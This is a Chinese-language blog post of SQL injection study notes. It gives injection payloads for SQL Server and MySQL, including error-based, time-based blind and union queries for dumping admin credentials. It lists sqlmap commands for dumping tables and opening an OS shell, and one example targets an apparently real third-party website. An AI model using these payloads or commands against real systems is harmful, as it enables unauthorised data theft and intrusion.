<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="第一部分：SQL注入语句常见的sql注入类型包括数字型和字符型，至于其他更加细分的注入类型其实上都可以算作是字符型注入。
0x00 数字型注入假设有一URL为HTTP://www.xxxser.com/test.php?id=8
可以猜测SQL语句为：
1select * from table wh">
    

    <!--Author-->
    
        <meta name="author" content="John Doe">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="Hexo">
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="Hexo">

    <!--Type page-->
    
        <meta property="og:type" content="website">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>Hexo</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        
            <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>
            <section class="main">
                
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/task6.html">
                Untitled
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-09-22</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1 id="第一部分：SQL注入语句"><a href="#第一部分：SQL注入语句" class="headerlink" title="第一部分：SQL注入语句"></a>第一部分：SQL注入语句</h1><p>常见的sql注入类型包括数字型和字符型，至于其他更加细分的注入类型其实上都可以算作是字符型注入。</p>
<h2 id="0x00-数字型注入"><a href="#0x00-数字型注入" class="headerlink" title="0x00 数字型注入"></a>0x00 数字型注入</h2><p>假设有一URL为HTTP://<a href="http://www.xxxser.com/test.php?id=8" target="_blank" rel="noopener">www.xxxser.com/test.php?id=8</a></p>
<p>可以猜测SQL语句为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where id=8</span><br></pre></td></tr></table></figure>

<p>测试步骤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.HTTP://www.xxser.com/test.php?id=8&apos;    	/*页面出现异常*/</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.HTTP://www.xxser.com/test.php?id=8 and 1=1 /*语句执行正常，无任何差异*/</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.HTTP://www.xxser.com/test.php?id=8 and 1=2  /*语句执行错误*/</span><br></pre></td></tr></table></figure>

<p>以上三个步骤全部满足，则程序可能存在SQL注入漏洞</p>
<p>漏洞出现原因：ASP、PHP这种弱类型的语言会自动推导变量类型，id=8为int类型，那么id=8 and 1=1则会被推导成为string类型。</p>
<h2 id="0x01-字符型注入"><a href="#0x01-字符型注入" class="headerlink" title="0x01 字符型注入"></a>0x01 字符型注入</h2><p>数字型与字符型注入最大的区别在于，数字型不需要单引号闭合，而字符串类型一般要使用单引号闭合，字符型注入最关键的是如何闭合SQL语句以及注释多余代码</p>
<p>原SQL代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where username=&apos;admin&apos;</span><br></pre></td></tr></table></figure>

<p>进行注入时输入”admin’ and 1=1 –”,注入之后的代码变为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where username = &apos;admin&apos; and 1=1--&apos;</span><br></pre></td></tr></table></figure>

<p>实际执行时”–”后面的内容就会被注释掉了。</p>
<p>注：数据库不同，字符串连接符也不同，SQL Server连接符为”+”,Oracle连接符为”||”，MySQL连接符为空格。</p>
<h2 id="0x02-SQL-Server"><a href="#0x02-SQL-Server" class="headerlink" title="0x02 SQL Server"></a>0x02 SQL Server</h2><h3 id="利用错误信息提取信息"><a href="#利用错误信息提取信息" class="headerlink" title="利用错误信息提取信息"></a>利用错误信息提取信息</h3><p>假设现有一张表：</p>
<figure class="highlight sql"><figcaption><span>server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">identity</span>(<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">  username <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  privs <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  email <span class="built_in">varchar</span>(<span class="number">50</span>))</span><br></pre></td></tr></table></figure>

<p>查询root用户详细信息语句如下：</p>
<figure class="highlight sql"><figcaption><span>server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'root'</span></span><br></pre></td></tr></table></figure>

<p>输入如下语句：</p>
<figure class="highlight sql"><figcaption><span>server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'having 1=1<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>最终执行SQL语句为：</p>
<figure class="highlight sql"><figcaption><span>server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'root'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'root'</span> <span class="keyword">having</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">--'</span></span><br></pre></td></tr></table></figure>

<p>SQL执行器抛出错误，’users.id’ 无效，该列没有包含在聚合函数或GROUP BY子句中</p>
<p>这个时候可以发现当前表名为 “users” ,而且存在 “id”列，接着输入如下语句：</p>
<figure class="highlight sql"><figcaption><span>server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'root'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'root'</span> <span class="keyword">group</span> <span class="keyword">by</span> users.id <span class="keyword">having</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">--'</span></span><br></pre></td></tr></table></figure>

<p>执行器抛出错误，选择列表中的列’users.username’ 无效，该列没有包含在聚合函数或GROUP BY子句中</p>
<p>可以发现，执行器又抛出了为’users.username’的列，可以通过同样的方法得到所有的列名。</p>
<h3 id="Order-by子句"><a href="#Order-by子句" class="headerlink" title="Order by子句"></a>Order by子句</h3><p>微软解释Order by子句：为SELECT查询的列表序，如果同时制定了TOP关键字，Order by子句在视图、内联函数、派生表和子查询中无效。</p>
<p>攻击者通常会注入Order by语句来判断此表的列数。</p>
<figure class="highlight sql"><figcaption><span>server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>  <span class="comment">/*SQL执行正常*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><figcaption><span>server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">Order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="comment">/*按照第一列排序，SQL执行正常*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><figcaption><span>server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">Order</span> <span class="keyword">by</span> <span class="number">2</span> </span><br><span class="line"><span class="comment">/*抛出异常 ORDER BY 位置号2超出了选择列表中项数的范围*/</span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-MySQL"><a href="#0x03-MySQL" class="headerlink" title="0x03 MySQL"></a>0x03 MySQL</h2><h3 id="错误回显注入"><a href="#错误回显注入" class="headerlink" title="错误回显注入"></a>错误回显注入</h3><p>公式分为四部分：</p>
<p>1.逻辑错误部分，也就是将GET变量取值别为逻辑错误值，例如.php?id=0或者.php?id=12+and+1=2</p>
<p>2.固定联合查询语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1 from (select+count(*),concat(floor(rand(0)*2),(注入爆数据语句))a from information_schema.tables group by a)b</span><br></pre></td></tr></table></figure>

<p>3.注释语句，将整个语句后面的部分注释掉可以用“/*”，“–”，“%23”</p>
<p>4.注入爆数据语句，基本格式就是select XXX from YYY,这条语句不能updata,select into,insert,load_file(),group_concat(),甚至concat()也不能用。这样爆数据要加上一个限制条件limit x,y。</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节注入是由编码不统一所造成的，这种注入一般出现在PHP+MySQL中，在PHP配置文件php.ini中，magic_quotes_gpc被打开时，输入单引号被转义变成了“ \ ‘ ”,是一个合法字符串，无法闭合单引号，所以注入类型是字符型时无法构成注入。</p>
<p>解决方法：可以输入“%d5’”代替直接输入一个单引号。</p>
<h3 id="长字符截取"><a href="#长字符截取" class="headerlink" title="长字符截取"></a>长字符截取</h3><p>MySQL的超长字符截取又名“SQL-Column-Truncation”,在MySQL中的设置sql_mode选项中，当sql-mode设置为default时，MySQL对插入超长值只会提示warning,而不报错。（MySQL 5.1）</p>
<p>有一张表，表结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table users(</span><br><span class="line">  id int(11) not null,</span><br><span class="line">  username varchar(7) not null,</span><br><span class="line">  password varchar(12) not null</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>(1)插入正常SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users(id,username,password) values(1,&apos;admin&apos;,&apos;admin&apos;);  /*无报错*/</span><br></pre></td></tr></table></figure>

<p>（2）插入错误语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users(id,username,password) values(1,&apos;admin    x&apos;,&apos;admin&apos;);  /*一条警告*/</span><br></pre></td></tr></table></figure>

<p>此时username的长度明显超过了8</p>
<p>此时查看user表，发现两条数据都被插进去了，查看长度都为7，也就是列的规定长度，由此可知，在默认值的情况下，如果数据超出列默认长度，MySQL会将其截断。</p>
<p>假设管理员登陆的用户名为admin,那么攻击者仅需注册一个”admin               “的用户就可轻易进入后台。      </p>
<h3 id="延时注入（基于时间盲注）"><a href="#延时注入（基于时间盲注）" class="headerlink" title="延时注入（基于时间盲注）"></a>延时注入（基于时间盲注）</h3><p>MySQL中有一个函数：SLEEP(duration),该函数的意思时延时数秒后运行语句</p>
<p>利用延时函数判断URL是否有sql注入漏洞举例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.secbug.org/user.jsp?id=1 //页面正常，1s左右打开页面</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.secbug.org/user.jsp?id=1&apos;//页面正常，1s左右打开页面</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.secbug.org/user.jsp?id=1&apos; and 1=1 //页面正常，1s左右打开页面</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.secbug.org/user.jsp?id=1 and sleep(3) //页面正常，3s左右打开页面</span><br></pre></td></tr></table></figure>

<p>通过sleep函数读出数据举例：</p>
<p>（1）查询当前用户，并取得字符串长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length(user())=0,sleep(3),1)</span><br></pre></td></tr></table></figure>

<p>循环0，如果出现三秒延迟就可判断出user字符串长度</p>
<p>（2）截取字符串第一个字符，并转换为ASCII码,将第一个字符的ASCII与ASCII码表对比，对比成功延时三秒</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(hex(mid(user(),1,1))=1,sleep(3),1)</span><br></pre></td></tr></table></figure>

<p>（3）重复步骤2，直到字符串截取完毕</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(hex(mid(user(),L,1))=N,sleep(3),1)</span><br></pre></td></tr></table></figure>

<p>注：L代表字符串的第几个字符，N代表ASCII码</p>
<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><p>注入方法：</p>
<p>（1）floor()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));</span><br></pre></td></tr></table></figure>

<p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5C20180920152859520.png" alt="20180920152859520"></p>
<p>(2)extractvalue()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>

<p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5C20180920152210223.png" alt="20180920152210223"></p>
<p>(3)updatexml()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>

<p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5C20180920152257851.png" alt="20180920152257851"></p>
<h2 id="php-MySQL注入查表语句与查字段语句"><a href="#php-MySQL注入查表语句与查字段语句" class="headerlink" title="php+MySQL注入查表语句与查字段语句"></a>php+MySQL注入查表语句与查字段语句</h2><p>查表语句格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,table_name from(select * from information_schema.tables where table_schema = 数据库名的hex order by table_schema limit 6,7)t limit 1</span><br></pre></td></tr></table></figure>

<p>数据库名字的hex可以通过database()获取然后去hex值即可，limit是查询范围，按照0，1、1，2这么查下去。</p>
<p>查到表后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,表名_name,5,6,7,8,9,10,11,12,13,14,表名_password,16,17,18,19,20,21 from 表名</span><br></pre></td></tr></table></figure>

<p>得到管理员的账号和密码后即可登陆</p>
<p>查字段语句格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,column_name from(select * from information_schema.columns where table_name=爆出来的表名的hex and table_schema=数据库名的hex order by 1 limit 2,1)t limit 1</span><br></pre></td></tr></table></figure>

<h2 id="php-MySQL字段数正确页面数字跳转问题"><a href="#php-MySQL字段数正确页面数字跳转问题" class="headerlink" title="php+MySQL字段数正确页面数字跳转问题"></a>php+MySQL字段数正确页面数字跳转问题</h2><p>问题描述：确认注入点后，使用order by可以正常猜解出字段数，但是当使用union select的时候，页面出现异常。通常会跳转至一个页面：xxx.com/n，其中n为某个数字，通常是404未找到。</p>
<p>问题发生原因：存在SQL注入的页面中的SQL语句，它所在的表段中，有一个字段是非数字型的。一旦用union select 数字，数字，数字…来替换了order by 就会跳转</p>
<p>解决方法：使用null来将这个异常的字段n来代替。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.gym-spa.com.tw/news.php?handle=detail&amp;id=12&apos;order+by+13%23</span><br><span class="line">/*正常*/</span><br></pre></td></tr></table></figure>

<p>注入点确认为字符型，字段数确认为13</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.gym-spa.com.tw/news.php?handle=detail&amp;id=0&apos;union+select+1,2,3,4,5,6,7,8,9,10,11,12,13%23</span><br><span class="line">/*3号位置有异常跳转至3*/</span><br><span class="line">http://www.gym-spa.com.tw/3</span><br></pre></td></tr></table></figure>

<p>跳转情况发生，这个时候用null替换掉3号位的数字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.gym-spa.com.tw/news.php?handle=detail&amp;id=0&apos;union+select+1,2,null,3,4,5,6,7,8,concat(database(),0x3a,user(),0x3a,version(),0x3a,@@datadir),10,11,12,13%23</span><br></pre></td></tr></table></figure>

<h2 id="MySQL中的几个小参数"><a href="#MySQL中的几个小参数" class="headerlink" title="MySQL中的几个小参数"></a>MySQL中的几个小参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(@@version_comment,0x5c,@@datadir,0x5c,@@tmpdir,0x5c,@@version,0x5c,user(),0x5c,database(),0x5c,@@version_compile_os,0x5c,@@version_compile_machine,0x5c,@@warning_count,0x5c,@@system_time_zone,0x5c,@@query_cache_size)</span><br></pre></td></tr></table></figure>

<h1 id="第二部分：SQLmap"><a href="#第二部分：SQLmap" class="headerlink" title="第二部分：SQLmap"></a>第二部分：SQLmap</h1><h2 id="SQLMap常用参数用法"><a href="#SQLMap常用参数用法" class="headerlink" title="SQLMap常用参数用法"></a>SQLMap常用参数用法</h2><p>1.判断是否存在注入点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://www.xxser.com/user.jsp?id=1&quot;</span><br></pre></td></tr></table></figure>

<p>2.获取数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://www.xxser.com/user.jsp?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>

<p>3.查看当前应用程序所用数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://www.xxser.com/user.jsp?id=1&quot; --current-db</span><br></pre></td></tr></table></figure>

<p>4.列出制定数据库的所有表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://www.xxser.com/user.jsp?id=1&quot; --table -D &quot;bbs&quot;</span><br></pre></td></tr></table></figure>

<p>5.读取指定表中的字段名称</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://www.xxser.com/user.jsp?id=1&quot; --columns -T &quot;User&quot; -D &quot;bbs&quot;</span><br></pre></td></tr></table></figure>

<p>6.读取指定字段内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://www.xxser.com/user.jsp?id=1&quot; --dump -C &quot;UserName,PassWord&quot; -T &quot;[User]&quot; -D &quot;bbs&quot;</span><br></pre></td></tr></table></figure>

<p>7.测试注入点权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u [URL] --privileges              //测试所有用户的权限</span><br><span class="line">sqlmap.py -u [URL] --privileges -U sa		 //测试sa用户权限</span><br></pre></td></tr></table></figure>

<p>8.执行Shell命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u [URL] --os-cmd=&quot;net user&quot;		//执行net user命令</span><br><span class="line">sqlmap.py -u [URL] --os-shell				//系统交互的shell</span><br></pre></td></tr></table></figure>

<p>9.执行SQL命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u [URL] --sql-shell				//返回SQL交互的shell,可执行SQL语句</span><br><span class="line">sqlmap.py -u [URL] --sql-query=&quot;sql&quot;</span><br></pre></td></tr></table></figure>

<p>10.POST提交方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u [URL] --data &quot;POST参数&quot;</span><br></pre></td></tr></table></figure>

<p>11.显示详细的等级</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u [URL] --dbs -v 1</span><br></pre></td></tr></table></figure>

<p>-v参数包含7个等级</p>
<p>-v 0:只显示Python的回溯，错误和关键消息；</p>
<p>-v 1：显示信息和警告消息；</p>
<p>-v 2:显示调试消息；</p>
<p>-v 3:有效载荷注入；</p>
<p>-v 4:显示HTTP请求；</p>
<p>-v 5:显示HTTP响应头；</p>
<p>-v 6:显示HTTP相应页面的内容。</p>
<p>12.注入HTTP请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r head.txt --dbs</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://www.cnblogs.com/hongfei/p/3872156.html" target="_blank" rel="noopener">https://www.cnblogs.com/hongfei/p/3872156.html</a></p>
<h1 id="第三部分：tamper脚本"><a href="#第三部分：tamper脚本" class="headerlink" title="第三部分：tamper脚本"></a>第三部分：tamper脚本</h1><p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5CSnipaste_2019-09-21_21-46-17.png" alt="Snipaste_2019-09-21_21-46-17"></p>
<p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5CSnipaste_2019-09-21_21-46-39.png" alt="Snipaste_2019-09-21_21-46-39"></p>
<p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5CSnipaste_2019-09-21_21-47-00.png" alt="Snipaste_2019-09-21_21-47-00"></p>
<p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5CSnipaste_2019-09-21_21-48-21.png" alt="Snipaste_2019-09-21_21-48-21"></p>
<p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5CSnipaste_2019-09-21_21-48-43.png" alt="Snipaste_2019-09-21_21-48-43"></p>
<p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5CSnipaste_2019-09-21_21-48-57.png" alt="Snipaste_2019-09-21_21-48-57"></p>
<p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5CSnipaste_2019-09-21_21-49-17.png" alt="Snipaste_2019-09-21_21-49-17"></p>
<p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5CSnipaste_2019-09-21_21-49-25.png" alt="Snipaste_2019-09-21_21-49-25"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​        第一次接触这些，几周下来依旧只学习了很浅显的一些东西，大部分学习的SQL注入的方法都没来的及复现，以后会慢慢补充，tamper脚本也没学如何编写，只收集了一些tamper脚本的功能描述，这点也是以后需要补充的，说到底欠缺的太多加学习能力有点差，慢慢补吧。</p>
<h2 id="参考链接或资料"><a href="#参考链接或资料" class="headerlink" title="参考链接或资料"></a>参考链接或资料</h2><p>sqlmap使用详解：<a href="https://www.cnblogs.com/hongfei/p/3872156.html" target="_blank" rel="noopener">https://www.cnblogs.com/hongfei/p/3872156.html</a></p>
<p>参考书籍：<a href="https://pan.baidu.com/s/1O4Y9l7qyfCtCw_hCzY1oUA" target="_blank" rel="noopener">https://pan.baidu.com/s/1O4Y9l7qyfCtCw_hCzY1oUA</a></p>
<p>​                    《Web安全深度剖析》</p>

    </div>

    

    

    <!-- Comments -->
    

</div>
            </section>
        
    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2019/09/08/index3/">Untitled</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/09/08/index2/">Untitled</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/09/08/index1/">Untitled</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://plus.google.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-google-plus"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.behance.net/">
